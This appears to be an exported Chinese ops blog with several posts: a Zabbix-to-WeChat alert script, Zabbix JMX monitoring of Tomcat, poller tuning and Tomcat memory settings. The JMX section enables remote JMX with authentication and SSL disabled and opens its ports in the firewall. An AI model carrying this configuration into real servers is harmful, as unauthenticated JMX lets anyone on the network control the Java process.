一个授权管理员，可以使用该应用给成员发消息 我们要取到这些信息： 成员账号 组织部门ID 应用ID CropID Secret 如何调用微信接口？ 调用微信接口需要一个调用接口的凭证：access_token 通过 ：CropID 、Secret 才能获取到access_token，但是获取到的token有效期为两分钟 微信企业号接口调试工具传送门：http://qydev.weixin.qq.com/debug 测试是否可通： 使用： curl -s -G url 获取 AccessToke 使用： curl --data url 传送凭证调用企业号接口 这里出现一个问题： curl -s -G url 获取 AccessToke时候为什么我在用企业号发送消息的时候总是返回{&quot;errcode&quot;:41004,&quot;errmsg&quot;:&quot;corpsecret missing”}呢？ 主要原因： 123“41004”说明：缺少secret参数，请排查相关问题。用“”把url括起来就OK，即curl -s -G \"url\"，估计你已经解决了，帮助后来者吧。 这个问题很棘手，一开始弄搞了一个半个小时后面看到一篇过来人的文章帮助了我：这里我也贴出来了。参考文档 python脚本原理 使用： self.__corpid = corpid 使用： self.__secret = secret 传送凭证调用企业号接口 脚本已贴出来了，可以下载 weixin.py 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990**#!/usr/bin/env python# -*- coding: utf-8 -*-import urllib,urllib2,jsonimport sysimport loggingreload(sys)sys.setdefaultencoding( \"utf-8\" )class WeChat(object): __token_id = '' # init attribute def __init__(self,url): self.__url = url.rstrip('/') self.__corpid = 'xxx' self.__secret = 'xxx' # Get TokenID def authID(self): params = &#123;'corpid':self.__corpid, 'corpsecret':self.__secret&#125; data = urllib.urlencode(params) content = self.getToken(data) try: self.__token_id = content['access_token'] # print content['access_token'] except KeyError: raise KeyError # Establish a connection def getToken(self,data,url_prefix='/'): url = self.__url + url_prefix + 'gettoken?' try: response = urllib2.Request(url + data) except KeyError: raise KeyError result = urllib2.urlopen(response) content = json.loads(result.read()) return content # Get sendmessage url def postData(self,data,url_prefix='/'): url = self.__url + url_prefix + 'message/send?access_token=%s' % self.__token_id request = urllib2.Request(url,data) try: result = urllib2.urlopen(request) except urllib2.HTTPError as e: if hasattr(e,'reason'): print 'reason',e.reason elif hasattr(e,'code'): print 'code',e.code return 0 else: content = json.loads(result.read()) result.close() return content # send message def sendMessage(self,touser,message): self.authID() data = json.dumps(&#123; 'touser':touser, 'toparty':\"3\", 'msgtype':\"text\", 'agentid':\"3\", 'text':&#123; 'content':message &#125;, 'safe':\"0\" &#125;,ensure_ascii=False) response = self.postData(data) log_file = \"/home/zabbix/weixin.log\" logging.basicConfig(filename=log_file,filemode='a',level=logging.DEBUG) logging.info(data) logging.debug(response) print responseif __name__ == '__main__': if len(sys.argv) != 4: print 'error segments, now exit' sys.exit() a = WeChat('https://qyapi.weixin.qq.com/cgi-bin') a.sendMessage(sys.argv[1],sys.argv[3]) log_file = &quot;/home/zabbix/weixin.log&quot; 微信日志 &apos;toparty&apos;:&quot;3&quot;, &apos;agentid&apos;:&quot;3&quot;, 这里3 是我这边应用ID 3 touser否成员ID列表（消息接收者，多个接收者用‘|’分隔，最多支持1000个）。特殊情况：指定为@all，则向关注该企业应用的全部成员发送 toparty否部门ID列表，多个接收者用‘|’分隔，最多支持100个。当touser为@all时忽略本参数 totag否标签ID列表，多个接收者用‘|’分隔。当touser为@all时忽略本参数 msgtype是消息类型，此时固定为：text agentid是企业应用的id，整型。可在应用的设置页面查看 content是消息内容 safe否表示是否是保密消息，0表示否，1表示是，默认0 &quot;touser&quot;:&quot;touser&quot;, #企业号中的用户帐号，在zabbix用户Media中配置，如果配置不正常，将按部门发送。 文中使用的用户, toparty 部门iD为3，agentid 应用ID为3. 为什么要这样写脚本？因为微信企业号开放的端口有固定的格式限制 企业号支持的格式：http://qydev.weixin.qq.com/wiki/index.php?title=消息类型及数据格式 将脚本放入zabbix默认执行路径下 mv weixin.sh /usr/local/zabbix/share/zabbix/alertscripts chown zabbix.zabbix /usr/local/zabbix/share/zabbix/alertscripts/weixin.py chmod +x /usr/local/zabbix/share/zabbix/alertscripts/weixin.py 到这里上面基本的已经配置完毕了。 测试脚本是否可以发送成功消息12[root@salt alertscripts]# python weixin.py test world!&#123;u'errcode': 60011, u'errmsg': u'no privilege to access/modify contact/party/agent '&#125; 出现我是企业号体验账户 我发送消息：微信错误 errcode=60011. 可参考：微信错误 errcode=60011 我这里的原因是应用ID一开始写1，后来改成3测试就通了。 12[root@salt alertscripts]# python weixin.py test hello world!&#123;u'invaliduser': u'all user invalid', u'errcode': 0, u'errmsg': u'ok'&#125; 这里用户关注了以后： 12[root@salt alertscripts]# python weixin.py jinyu hello world!&#123;u'errcode': 0, u'errmsg': u'ok'&#125; web服务端配置：至此工具安装完成，在zabbix界面里添加脚本告警 设置脚本，脚本名称为工具名称，设置好点添加按钮 添加新的报警媒介到用户，我以Admin用户为例 添加 选择刚才的媒介，收件人为我提供的UserID，多个用户用｜隔开 添加后一点要点更新 我们在这里独立设置一个Action，当然你也可以在默认的Action里添加 名称为weixin 告警消息的格式，大家可以根据自己需求具体设置，下面是我的设置 默认接收人：故障{TRIGGER.STATUS},服务器:{HOSTNAME1}发生: {TRIGGER.NAME}故障! 默认信息： 123456789101112131415161718192021告警主机:&#123;HOSTNAME1&#125;告警时间:&#123;EVENT.DATE&#125; &#123;EVENT.TIME&#125;告警等级:&#123;TRIGGER.SEVERITY&#125;告警信息: &#123;TRIGGER.NAME&#125;告警项目:&#123;TRIGGER.KEY1&#125;问题详情:&#123;ITEM.NAME&#125;:&#123;ITEM.VALUE&#125;前状态:&#123;TRIGGER.STATUS&#125;:&#123;ITEM.VALUE1&#125;事件ID:&#123;EVENT.ID&#125;恢复主旨：恢复&#123;TRIGGER.STATUS&#125;, 服务器:&#123;HOSTNAME1&#125;: &#123;TRIGGER.NAME&#125;已恢复!恢复信息：告警主机:&#123;HOSTNAME1&#125;告警时间:&#123;EVENT.DATE&#125; &#123;EVENT.TIME&#125;告警等级:&#123;TRIGGER.SEVERITY&#125;告警信息: &#123;TRIGGER.NAME&#125;告警项目:&#123;TRIGGER.KEY1&#125;问题详情:&#123;ITEM.NAME&#125;:&#123;ITEM.VALUE&#125;当前状态:&#123;TRIGGER.STATUS&#125;:&#123;ITEM.VALUE1&#125;事件ID:&#123;EVENT.ID&#125; 切换到操作标签，添加操作选择发送到Admin用户，只使用weixin，选择好之后点添加,这里我已经添加过了，所以提示更新。设置好之后如下，点添加 经过以上步骤，就完成了配置，就可以使用zabbix来告警啦，用dd命令测试下磁盘i/o告警，一会就会看到微信上发过来的告警信息 dd if=/dev/zero of=/tmp/test2.img bs=1024M count=1000 oflag=dsync 课外普及：普及： 如何正确使用dd工具测试磁盘的I/O速度 一般情况下，我们都是使用dd命令创建一个大文件来测试磁盘的读写速度。但是，很多人都存在一个误区，以为dd命令显示的速度就是磁盘的写入速度，其实这是不然的。我们分析一下dd命令是如何工作的。 dd if=/dev/zero of=/xiaohan/test.iso bs=1024M count=1 这种情况下测试显示的速度是dd命令将数据写入到内存缓冲区中的速度，只有当数据写入内存缓冲区完成后，才开始将数据刷入硬盘，所以这时候的数据是无法正确衡量磁盘写入速度的。 dd if=/dev/zero of=/xiaohan/test.iso bs=1024M count=1;sync 这种情况下测试显示的跟上一种情况是一样的，两个命令是先后执行的，当sync开始执行的时候，dd命令已经将速度信息打印到了屏幕上，仍然无法显示从内存写硬盘时的真正速度。 dd if=/dev/zero of=/xiaohan/test.iso bs=1024M count=1 conv=fdatasync 这种情况加入这个参数后，dd命令执行到最后会真正执行一次“同步(sync)”操作，所以这时候你得到的是读取这128M数据到内存并写入到磁盘上所需的时间，这样算出来的时间才是比较符合实际的。 dd if=/dev/zero of=/xiaohan/test.iso bs=1024M count=1 oflag=dsync 这种情况下，dd在执行时每次都会进行同步写入操作。也就是说，这条命令每次读取1M后就要先把这1M写入磁盘，然后再读取下面这1M，一共重复128次。这可能是最慢的一种方式，基本上没有用到写缓存(write cache)。 总结： 建议使用测试写速度的方式为： dd if=/dev/zero of=/xiaohan/test.iso bs=1024M count=1 conv=fdatasync 建议使用测试读速度的方式为： dd if=/xiaohan/test.iso of=/dev/zero bs=1024M count=1 iflag=direct *注：要正确测试磁盘读写能力，建议测试文件的大小要远远大于内存的容量！！！ PS：后续计划1.后续可能会增加发送次数计数，方便管理用户 2.添加查询操作到微信，针对用户定制开发。可通过微信查询zabbix服务器里监控主机的状态，通过微信简单操作zabbix。 预览 注意事项及报错处理 #Zabbix-web页面新增用户权限处理，发送对象选择（用户的名称） #应用当中可见范围选择注意（选这要发送的对象（部门，及部门成员）） zabbix-server2.4服务端编译安装 zabbix-server服务端编译安装 zabbix2.4监控80端口状态 : zabbix监控80端口状态 zabbix+Grafana安装使用监控结合 ：zabbix+Grafana安装使用监控结合 zabbix监控MySQL-添加自定义监控项 : zabbix监控MySQL-添加自定义监控项 zabbix的ICMP_Ping模版实现对客户端网络状态的监控 : zabbix的ICMP_Ping模版实现对客户端网络状态的监控 zabbix性能监控故障总结 zabbix性能监控故障总结","raw":null,"content":null,"categories":[{"name":"monitoring","slug":"monitoring","permalink":"http://blog.yangcvo.me/categories/monitoring/"}],"tags":[{"name":"zabbix","slug":"zabbix","permalink":"http://blog.yangcvo.me/tags/zabbix/"}]},{"title":"zabbix3.0部署jmx监控tomcat","slug":"性能监控/Zabbix/zabbix3-0部署jmx监控tomcat","date":"2016-06-21T10:42:58.000Z","updated":"2017-03-16T03:24:41.000Z","comments":true,"path":"2016/06/21/性能监控/Zabbix/zabbix3-0部署jmx监控tomcat/","link":"","permalink":"http://blog.yangcvo.me/2016/06/21/性能监控/Zabbix/zabbix3-0部署jmx监控tomcat/","excerpt":"","text":"zabbix提供了一个java gateway的应用去监控jmx（Java Management Extensions，即Java管理扩展）是一个为应用程序、设备、系统等植入管理功能的框架。JMX可以跨越一系列异构操作系统平台、系统体系结构和网络传输协议，灵活的开发无缝集成的系统、网络和服务管理应用。 一. Zabbix 的JMX监控架构 一：部署环境123Centos 6.7Zabbix 3.0.3Tomcat 7.0.55 服务端配置1、安装jdk（版本1.7.0_79）JDK 各自的版本7.0 还是8.0 版本官网下载：JDK 我这里也上传了7.0.67 版本的和8.0版本的jdk源码包： 7.0JDK源码包 8.0JDK源码包 并上传到zabbix server 直接解压下载下来的包到自定义的目录： 1tar -zxvf jdk1.7.0_67.tar.gz -C /srv/ 安装成功之后添加系统环境变量 123456cd /etc/profile.dvim java.shexport JAVA_HOME=/srv/jdk1.7.0_67export CLASS_PATH=\"$JAVA_HOME/lib:$JAVA_HOME/jre/lib\"export PATH=$PATH:$JAVA_HOME/bin 使配置生效 1source /etc/profile 安装与配置比较简单。执行java -version命令，出现类似界面表示成功。 1234java -versionjava version \"1.7.0_67\"Java(TM) SE Runtime Environment (build 1.7.0_67-b01)Java HotSpot(TM) 64-Bit Server VM (build 24.65-b04, mixed mode) 如果出现问题，查看下环境变量是否设置。 2、安装Zabbix-Java-gatewayZabbix2.0起添加了支持用于监控JMX应用程序的服务进程，称为“Zabbix-Java-gateway”，它是用java写的一个程序。 可使用rpm进行安装，我使用源码安装，大家可在安装zabbix时启用–enable-java参数即可安装zabbix java gateway，如果第一次没有加载，可重新加载编译安装 有两种方法可以安装Zabbix-Java-gateway，第1种是编译安装zabbix时添加–enable java参数。第2种是单独安装，步骤如下： 第一种方法： 安装gateway，需要java，java-devel依赖 123yum install －ｙ http://repo.zabbix.com/zabbix/2.4/rhel/6/x86_64/zabbix-release-2.4-1.el6.noarch.rpm 安装yum源yum install -y java java-devel zabbix-java-gateway 安装gateway 测试是否成功： 第一：测试java是否成功 1234java -versionjava version \"1.7.0_67\"Java(TM) SE Runtime Environment (build 1.7.0_67-b01)Java HotSpot(TM) 64-Bit Server VM (build 24.65-b04, mixed mode) 第二：测试gateway是否安装成功 12service zabbix-java-gateway statuszabbix-java-gateway is stopped 第二种方法： 我这里升级3.0.3版本的时候已经安装好了。所以如果没有安装上的可以单独安装没关系的： 不受影响步骤如下： 1234# tar zxvf zabbix-3.0.3.tar.gz# cd zabbix-3.0.3# ./configure --enable-java --prefix=/data/zabbix/zabbix_java #/data/zabbix是我的zabbix安装目录# make &amp;&amp; make install 我的目录是默认在/usr/local/zabbix/sbin/zabbix_java/ 3、修改Java-gateway的配置文件并启动它配置文件单独安装的路径为/data/zabbix/zabbix_java/sbin/zabbix_java/settings.sh我这里是这个目录。具体根据实际安装情况） /usr/local/zabbix/sbin/zabbix_java/settings.sh启用以下参数： 123LISTEN_IP=\"127.0.0.1\" #监听地址LISTEN_PORT=10052 #监听端口START_POLLERS=50 # 开启的工作线程数（必须大于等于后面zabbix_server.conf文件的StartJavaPollers参数） #必须配置，启动的进出数 注意事项： 配置文件PID_FILE的路径必须是正确的，可以自己去cd找，yum安装默认情况下不用改动。 START_POLLERS项是配置启动的进出数，该值必须大于等于Zabbix-Server里面的startJavaPollers项。 进入/usr/local/zabbix/sbin/zabbix_java/目录，执行./startup.sh 检查端口是否监听： 12netstat -anp|grep 10052tcp 0 0 0.0.0.0:10052 0.0.0.0:* LISTEN 21949/java 查看是否已经监听10052端口，如果已监听，表示启动成功，如果没有，可通过zabbix_server日志查看解决 4、修改zabbix_server的配置文件并重启12345vim /usr/local/zabbix/etc/zabbix_server.confJavaGateway=127.0.0.1 # JavaGateway 服务器地址，zabbix_server与zabbix_java_gateway在同一台主机JavaGatewayPort=10052 #端口StartJavaPollers=5 # #设定连接java gateway 的进程数，当设置为0时表示不具有抓取java信息的能力 5、 添加catalina-jmx-remote.jar添加catalina-jmx-remote.jar到zabbix java gateway的lib目录下，catalina-jmx-remote.jar包可在http://archive.apache.org/dist/tomcat/下，在各版本目录的bin/extras/子目录下 12cd /usr/local/zabbix/sbin/zabbix_java/lib/wget http://archive.apache.org/dist/tomcat/tomcat-7/v7.0.55/bin/extras/catalina-jmx-remote.jar 重启服务zabbix和java gateway 并加入启动项并验证： 123/etc/init.d/zabbix_server restart/usr/local/zabbix/sbin/zabbix_java/shutdown.sh/usr/local/zabbix/sbin/zabbix_java/startup.sh 6.下载测试工具cmdline-jmxclient-0.10.3.jarcmdline-jmxclient-0.10.3.jar为一个测试工具，可用来测试jmx是否配置正确，下载cmdline-jmxclient-0.10.3.jar(下载到任意目录) 1wget http://crawler.archive.org/cmdline-jmxclient/cmdline-jmxclient-0.10.3.jar 二、被监控tomcat 配置［被监控tomcat操作］下载catalina-jmx-remote.jar1234cd /srv/tomcat/tomcat-account/lib/wget http://archive.apache.org/dist/tomcat/tomcat-7/v7.0.55/bin/extras/catalina-jmx-remote.jar #我的tomcat版本是7.0.55chown -R tomcat:tomcat catalina-jmx-remote.jarchmod +x catalina-jmx-remote.jar 我的tomcat版本是7.0.55 将下载后后的jar包放到被监控的tomcat实例的lib目录下。 查看tomcat的版本 这里之前也自己也忘记了tomcat的版本是多少了，所以我先查看下然后在下载： 123456789101112131415cd /srv/tomcat/tomcat_account/bin[root@tomcat_A1 bin]# ./version.sh --Using CATALINA_BASE: /srv/tomcat/tomcat_accountUsing CATALINA_HOME: /srv/tomcat/tomcat_accountUsing CATALINA_TMPDIR: /srv/tomcat/tomcat_account/tempUsing JRE_HOME: /srv/jdk1.7.0_67Using CLASSPATH: /srv/tomcat/tomcat_account/bin/bootstrap.jar:/srv/tomcat/tomcat_account/bin/tomcat-juli.jarServer version: Apache Tomcat/7.0.55Server built: Jul 18 2014 05:34:04Server number: 7.0.55.0OS Name: LinuxOS Version: 2.6.32-573.8.1.el6.x86_64Architecture: amd64JVM Version: 1.7.0_67-b01JVM Vendor: Oracle Corporation 在tomcat端配置JMX。（tomcat/bin/catalina.sh）自己安装的tomcat路径，找到catalina.sh文件。 网上很多人修改tomcat/bin/下的catalina.sh，添加如下内容： 12345CATALINA_OPTS=\"-Dcom.sun.management.jmxremote-Dcom.sun.management.jmxremote.authenticate=false-Dcom.sun.management.jmxremote.ssl=false-Dcom.sun.management.jmxremote.port=12345 #定义jmx监听端口-Djava.rmi.server.hostname=192.168.7.186\" 我这里是直接在bin目录下面创建自定义的脚本。 修改setenv.shvi /srv/tomcat/tomcat-account/bin/setenv.sh 添加如下 12345CATALINA_OPTS=\"$&#123;CATALINA_OPTS&#125; -Djava.rmi.server.hostname=192.168.7.186\"CATALINA_OPTS=\"$&#123;CATALINA_OPTS&#125; -Djavax.management.builder.initial=\"CATALINA_OPTS=\"$&#123;CATALINA_OPTS&#125; -Dcom.sun.management.jmxremote=true\"CATALINA_OPTS=\"$&#123;CATALINA_OPTS&#125; -Dcom.sun.management.jmxremote.ssl=false\"CATALINA_OPTS=\"$&#123;CATALINA_OPTS&#125; -Dcom.sun.management.jmxremote.authenticate=false\" 注意：hostname位机器ip地址，即被监控机器对外服务地址 3.修改server.xmlvi /opt/apache-tomcat/conf/server.xml添加如下，注意添加位置在 1&lt;Listener className=\"org.apache.catalina.core.ThreadLocalLeakPreventionListener\" /&gt; 之后添加如下代码 1&lt;Listener className=\"org.apache.catalina.mbeans.JmxRemoteLifecycleListener\" rmiRegistryPortPlatform=\"12345\" rmiServerPortPlatform=\"12345\" /&gt; 3、重启tomcat这里我之前是用写好的启动脚本去启动的，发现一个问题。因为我都是用/etc/init.d/tomcat stop start 来启动。可是发现服务启动了，可是之前的tomcat服务端口不见了。我之前的tomcat服务端口10001 然后查看日志出现报错： 123456789101112131415161718192021 at java.lang.reflect.Method.invoke(Method.java:606) at org.apache.commons.daemon.support.DaemonLoader.start(DaemonLoader.java:243)Caused by: java.lang.IllegalArgumentException: jmxremote.access (没有那个文件或目录) at javax.management.remote.rmi.RMIConnectorServer.start(RMIConnectorServer.java:373) at org.apache.catalina.mbeans.JmxRemoteLifecycleListener.createServer(JmxRemoteLifecycleListener.java:313) at org.apache.catalina.mbeans.JmxRemoteLifecycleListener.lifecycleEvent(JmxRemoteLifecycleListener.java:259) at org.apache.catalina.util.LifecycleSupport.fireLifecycleEvent(LifecycleSupport.java:117) at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:90) at org.apache.catalina.util.LifecycleBase.setStateInternal(LifecycleBase.java:402) at org.apache.catalina.util.LifecycleBase.setState(LifecycleBase.java:347) at org.apache.catalina.core.StandardServer.startInternal(StandardServer.java:732) at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:150) ... 11 moreCaused by: java.io.FileNotFoundException: jmxremote.access (没有那个文件或目录) at java.io.FileInputStream.open(Native Method) at java.io.FileInputStream.&lt;init&gt;(FileInputStream.java:146) at java.io.FileInputStream.&lt;init&gt;(FileInputStream.java:101) at com.sun.jmx.remote.security.MBeanServerFileAccessController.propertiesFromFile(MBeanServerFileAccessController.java:294) at com.sun.jmx.remote.security.MBeanServerFileAccessController.&lt;init&gt;(MBeanServerFileAccessController.java:133) at javax.management.remote.rmi.RMIConnectorServer.start(RMIConnectorServer.java:371) ... 19 more 这里先kill -9 tomcat进程只需要在/bin/目录下面启动服务。./startup.sh然后查看有下面的12345 12346 进程 和tomcat进程10001 说明就对了。 1234567891011121314[root@tomcat_A1 bin]# netstat -ntulpActive Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program nametcp 0 0 10.46.72.172:10050 0.0.0.0:* LISTEN 8483/zabbix_agentdtcp 0 0 127.0.0.1:8006 0.0.0.0:* LISTEN 8942/javatcp 0 0 0.0.0.0:4041 0.0.0.0:* LISTEN 8942/javatcp 0 0 0.0.0.0:10001 0.0.0.0:* LISTEN 8942/javatcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 1363/sshdtcp 0 0 0.0.0.0:36440 0.0.0.0:* LISTEN 8942/javatcp 0 0 0.0.0.0:12345 0.0.0.0:* LISTEN 8942/javatcp 0 0 0.0.0.0:12346 0.0.0.0:* 1374/ntpdudp 0 0 10.46.72.172:123 0.0.0.0:* 1374/ntpdudp 0 0 127.0.0.1:123 0.0.0.0:* 1374/ntpdudp 0 0 0.0.0.0:123 0.0.0.0:* 1374/ntpd 重启zabbix agent 1service zabbix-agent restart 注：防火墙需要开放12345，12346端口 12-A INPUT -i eth0 -p tcp -m state --state NEW -m tcp --dport 12345 -j ACCEPT-A INPUT -i eth0 -p tcp -m state --state NEW -m tcp --dport 12346 -j ACCEPT ###4、服务端测试是否可以获取数据 命令行下测试需要cmdline-jmxclient-0.10.3.jar这个包，测试结果如下： 这个包下载地址:cmdline-jmxclient-0.10.3.jar 在zabbix server上执行 1java -jar /tmp/cmdline-jmxclient-0.10.3.jar - 192.168.7.186:12345 java.lang:type=Memory NonHeapMemoryUsage 如果有如下回显表示jmx配置正确，如不正确，请检查配置,看下端口启动是否正常，server.xml 配置。 1234507/22/2016 14:45:28 +0800 org.archive.jmx.Client NonHeapMemoryUsage:committed: 80347136init: 24576000max: 136314880used: 46634984 写个脚本自动判断： 123vim context.sh#!/bin/bashjava -jar /opt/tomcat/cmdline-jmxclient-0.10.3.jar - 10.46.72.172:12345 Catalina:type=Manager,*| awk -F \",\" '&#123; print $1 &#125;'|awk -F: '&#123; print $2 &#125;'&gt;/tmp/tomcat/context.csv 三、导入模板到zabbix，并关联到主机，添加监控这样也可以选择系统自带的，我这里zabbix版本是3.0的，系统自带的可以选择：选择配置：主机-模板-选择-模板-：Template JMX TomcatTemplate JMX Generic 从网上下载了一个不错的模板，导入后如下： 导入模板以后主机添加端口： 然后查看图形： 就有了。 四、如何监控单主机多个tomcat监控多个tomcat实例，网上的详细的配置文档很少，几乎没有。比较好的办法是使用自动发现，但刚使用zabbix，来不及研究，所以采用笨法，修改模板、监控项、图形来达到最终目的。关键配置：1、添加主机时添加多个jmx端口 2、修改监控项、键值在同一主机上，zabbix不允键值重复，但是监控的项目是一样的，不可能键值写的不重复，经过几番搜索，找到方法如下：只要在箭头处添加1个空格就可以，也可以是多个。（注意位置不要错，在逗到后面） 剩下的就是体力活了，克隆监控项、修改监控项、克隆图形、修改图形。。。以下是两个tomcat实例的监控项： 多个tomcat在一台主机上面最后的监控效果如下： 一开始zabbix监控tomcat 一路顺畅，可是到测试正不正常时候，返回拒绝连接，第一时间想到就是配置有问题： 我是参考这个解决了。 具体参数内容请参考 apache tomcat 文档 也非常感谢：张爱德大神 一路zabbix上面的帮我一起排坑： zabbix大神 他的博客blog：https://blog.cactifans.com","raw":null,"content":null,"categories":[{"name":"monitoring","slug":"monitoring","permalink":"http://blog.yangcvo.me/categories/monitoring/"}],"tags":[{"name":"zabbix","slug":"zabbix","permalink":"http://blog.yangcvo.me/tags/zabbix/"}]},{"title":"Zabbix3.0 poller processes more than 75% busy警报问题解决","slug":"性能监控/Zabbix/zabbix3.0 poller processes more than 75% busy警报问题解决","date":"2016-06-21T10:42:58.000Z","updated":"2017-03-21T10:25:14.000Z","comments":true,"path":"2016/06/21/性能监控/Zabbix/zabbix3.0 poller processes more than 75% busy警报问题解决/","link":"","permalink":"http://blog.yangcvo.me/2016/06/21/性能监控/Zabbix/zabbix3.0 poller processes more than 75% busy警报问题解决/","excerpt":"","text":"虽然Zabbix的监控警报各种有，但chengyang使用碰到最多的几个莫过于内存耗尽，网络不通，IO太慢还有这个“Zabbix poller processes more than 75% busy”了。一开始的时候因为这个即不影响使用也持续一会儿就自行解决就没有多在意。然后随着数据库的增大，Zabbix消耗的内存可是越来越多，Poller processes（轮询）开始天天Busy了，最终chengyang不得不把Zabbix挪到了另外一台服务器上。 但这并没有彻底解决问题，警报仍然三天两头来几个。之后Kaijia开启了Zabbix警报的邮件功能，于是开始频繁收到这类邮件，于是Kaijia决定解决这个问题。Google了一下资料，没有找到很权威的答案，造成轮询忙的问题有很多中，支撑Zabbix的MySQL卡住了，Zabbix服务器的IO卡住了都有可能，Zabbix进程分配到内存不足都有可能。一个简单的方法是增加Zabbix Server启动时初始化的进程数量，这样直接增加了轮询的负载量，从比例上来讲忙的情况就少了。 增加初始化进程的方法非常简单，编辑Zabbix Server的配置文件/etc/zabbix/zabbix_server.conf，找到配置StartPollers的段落： 12345671. ### Option: StartPollers2. # Number of pre-forked instances of pollers.3. #4. # Mandatory: no5. # Range: 0-10006. # Default:7. # StartPollers=5 取消StartPollers=一行的注释或者直接在后面增加： 1StartPollers=10 因为之前zabbix除了单独跑一个server服务还有agent还有grafana-server还有代理，后面我先扩大内存和服务器CPU.将StartPollers改成多少取决于服务器的性能和监控的数量，Kaijia将StartPollers设置成12之后就再没有遇到过警报。如果内存足够的话可以设置更高。设置完成之后运行： 1service zabbix-server restart 重启Zabbix。当然另外一种从整体上降低Zabbix服务器负载的方法就是定期重启Zabbix，这种方法可以用Cron实现，运行： 1crontab -e 在调出的Cron编辑器中增加一个计划： 100 * * * * service zabbix-server restart &gt; /dev/null 2&gt;&amp;1 这个计划会每天自动重启Zabbix服务以结束僵尸进程并清理内存等。目前Kaijia这样配置Zabbix后还没有再次遇到过“Zabbix poller processes more than 75% busy”的问题。 关联文章 zabbix性能监控故障总结 zabbix3.0部署jmx监控tomcat zabbix的ICMP_Ping模版实现对客户端网络状态的监控","raw":null,"content":null,"categories":[{"name":"monitoring","slug":"monitoring","permalink":"http://blog.yangcvo.me/categories/monitoring/"}],"tags":[{"name":"Performance monitoring","slug":"Performance-monitoring","permalink":"http://blog.yangcvo.me/tags/Performance-monitoring/"},{"name":"zabbix","slug":"zabbix","permalink":"http://blog.yangcvo.me/tags/zabbix/"}]},{"title":"记一次线上tomcat内存不足配置并发优化过程","slug":"Web服务技术/tomcat/记一次线上tomcat内存不足配置并发优化过程","date":"2016-06-21T09:44:04.000Z","updated":"2017-04-17T16:00:57.000Z","comments":true,"path":"2016/06/21/Web服务技术/tomcat/记一次线上tomcat内存不足配置并发优化过程/","link":"","permalink":"http://blog.yangcvo.me/2016/06/21/Web服务技术/tomcat/记一次线上tomcat内存不足配置并发优化过程/","excerpt":"","text":"前言：tomcat的内存使用配置,最大连接数配置。如何修改配置呢，在/tomcat的/bin/下面有个这个脚本文件。catailna.sh 脚本文件。 如果windows 是bat设置tomcat的使用内存，也其实就是设置jim的使用参数。 设置Tomcat启动的初始内存其初始空间(即-Xms)是物理内存的1/64，最大空间(-Xmx)是物理内存的1/4。可以利用JVM提供的-Xmn -Xms -Xmx等选项可 要加“m”说明是MB，否则就是KB了，在启动tomcat时会 报内存不足。 123-Xms：初始值 【初始化内存大小】-Xmx：最大值 【可以使用的最大内存】-Xmn：最小值 JVM堆的设置是指java程序运行过程中JVM可以调配使用的内存空间的设置.JVM在启动的时候会自动设置Heap size的值，其初始空间(即-Xms)是物理内存的1/64，最大空间(-Xmx)是物理内存的1/4。可以利用JVM提供的-Xmn -Xms -Xmx等选项可进行设置。Heap size 的大小是Young Generation 和Tenured Generaion 之和。 提示：在JVM中如果98％的时间是用于GC且可用的Heap size 不足2％的时候将抛出此异常信息. 提示：Heap Size 最大不要超过可用物理内存的80％，一般的要将-Xms和-Xmx选项设置为相同，而-Xmn为1/4的-Xmx值。 这两个值的大小一般根据需要进行设置。初始化堆的大小执行了虚拟机在启动时向系统申请的内存的大小。一般而言，这个参数不重要。但是有的应用 程序在大负载的情况下会急剧地占用更多的内存，此时这个参数就是显得非常重要，如果虚拟机启动时设置使用的内存比较小而在这种情况下有许多对象进行初始 化，虚拟机就必须重复地增加内存来满足使用。由于这种原因，我们一般把-Xms和-Xmx设为一样大，而堆的最大值受限于系统使用的物理内存。一般使用数 据量较大的应用程序会使用持久对象，内存使用有可能迅速地增长。当应用程序需要的内存超出堆的最大值时虚拟机就会提示内存溢出，并且导致应用服务崩溃。因 此一般建议堆的最大值设置为可用内存的最大值的80%。 如果系统花费很多的时间收集垃圾，请减小堆大小。一次完全的垃圾收集应该不超过 3-5 秒。如果垃圾收集成为瓶颈，那么需要指定代的大小，检查垃圾收集的详细输出，研究 垃圾收集参数对性能的影响。一般说来，你应该使用物理内存的 80% 作为堆大小。当增加处理器时，记得增加内存，因为分配可以并行进行，而垃圾收集不是并行的。在重启你的Tomcat服务器之后，这些配置的更改才会有效。 1Windows下，在文件&#123;tomcat_home&#125;/bin/catalina.bat，Unix下，在文件&#123;tomcat_home&#125;/bin/catalina.sh的前面，增加如下设置： Tomcat内存优化Tomcat内存优化主要是对 tomcat 启动参数优化，我们可以在 tomcat 的启动脚本 catalina.sh 中设置JAVA_OPTS 参数。 1234567891.JAVA_OPTS参数说明Java代码 -server 启用jdk 的 server 版； -Xms java虚拟机初始化时的最小内存； -Xmx java虚拟机可使用的最大内存； -XX:PermSize 内存永久保留区域 -XX:MaxPermSize 内存最大永久保留区域 服务器参数配置12345678 tomcat默认： -Xms1024m -Xmx1024m -Xss1024K -XX:PermSize=128m -XX:MaxPermSize=256mJava代码 JAVA_OPTS=\"-Djava.awt.headless=true -Dfile.encoding=UTF-8 -server -Xms2048m -Xmx2048m -XX:NewSize=512m -XX:MaxNewSize=512m -XX:PermSize=512m -XX:MaxPermSize=512m -XX:+DisableExplicitGC\" 配置完成后可重启Tomcat ，通过以下命令进行查看配置是否生效： 首先查看Tomcat进程号：1ps -ef | grep tomcat 我们可以看到Tomcat 进程号是 32179 。 实践例子： 先查看没有优化tomcat内存前： 1sudo jmap – heap 32179 查看是否配置生效：123Xml代码sudo jmap – heap 32179 我们可以看到MaxHeapSize 等参数已经生效。 提示：如果jdk1.8 启动服务会有警告⚠️ Java HotSpot(TM) 64-Bit Server VM warning: ignoring option PermSize=512m; support was removed in 8.0 Tomcat并发优化1.Tomcat连接相关参数 在Tomcat 配置文件conf下面 server.xml 中的 配置中 在tomcat配置文件server.xml中的配置中，和连接数相关的参数有： 